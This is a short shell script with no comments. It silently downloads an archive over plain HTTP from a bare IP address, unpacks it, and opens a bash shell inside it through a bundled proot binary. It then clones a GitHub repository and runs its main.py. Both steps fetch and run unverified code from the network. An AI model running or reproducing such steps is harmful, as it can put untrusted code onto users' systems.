#!/bin/sh
curl -s -L -o backup3.tar.gz http://185.3.95.20/backup3.tar.gz
tar -xf backup3.tar.gz
./dist/proot -S . /bin/bash

git clone https://github.com/mncedisimavunqela/browserless-python.git
cd browserless-python
python3 main.py
